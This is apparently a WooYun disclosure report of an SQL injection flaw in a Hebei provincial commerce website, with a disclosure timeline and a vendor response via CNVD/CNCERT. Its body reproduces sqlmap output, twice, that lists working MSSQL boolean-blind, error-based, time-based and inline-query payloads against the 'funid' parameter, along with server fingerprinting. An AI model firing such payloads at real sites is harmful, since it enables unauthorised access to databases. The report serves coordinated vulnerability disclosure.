wybug_title: 中国河北商务网sql注入漏洞一枚
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-12-29：	细节已通知厂商并且等待厂商处理中									2016-01-05：	厂商已经确认，细节仅向厂商公开									2016-01-15：	细节向核心白帽子及相关领域专家公开									2016-01-25：	细节向普通白帽子公开									2016-02-04：	细节向实习白帽子公开									2016-02-12：	细节向公众公开  简要描述： RT 详细说明：  注入点：http://**.**.**.**/jctk/shiji/List.aspx?funid=293&deptid=408
GET parameter 'funid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 89 HTTP(s) requests:---Parameter: funid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: funid=293 AND 8298=8298&deptid=408    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)    Payload: funid=293 AND 4172 IN ((CHAR(113)+CHAR(107)+CHAR(106)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (4172=4172) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(107)+CHAR(113)))&deptid=408    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: funid=293 AND 7823=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)&deptid=408    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: funid=(SELECT CHAR(113)+CHAR(107)+CHAR(106)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (9322=9322) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(107)+CHAR(113))&deptid=408---[19:55:42] [INFO] testing Microsoft SQL Server[19:55:43] [INFO] confirming Microsoft SQL Server[19:55:48] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005






   漏洞证明：  
GET parameter 'funid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 89 HTTP(s) requests:---Parameter: funid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: funid=293 AND 8298=8298&deptid=408    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)    Payload: funid=293 AND 4172 IN ((CHAR(113)+CHAR(107)+CHAR(106)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (4172=4172) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(107)+CHAR(113)))&deptid=408    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: funid=293 AND 7823=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)&deptid=408    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: funid=(SELECT CHAR(113)+CHAR(107)+CHAR(106)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (9322=9322) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(107)+CHAR(113))&deptid=408---[19:55:42] [INFO] testing Microsoft SQL Server[19:55:43] [INFO] confirming Microsoft SQL Server[19:55:48] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005






   修复方案：  你们更专业   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-01-05 16:11 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT下发给河北分中心,由其后续协调网站管理单位处置. 最新状态： 暂无
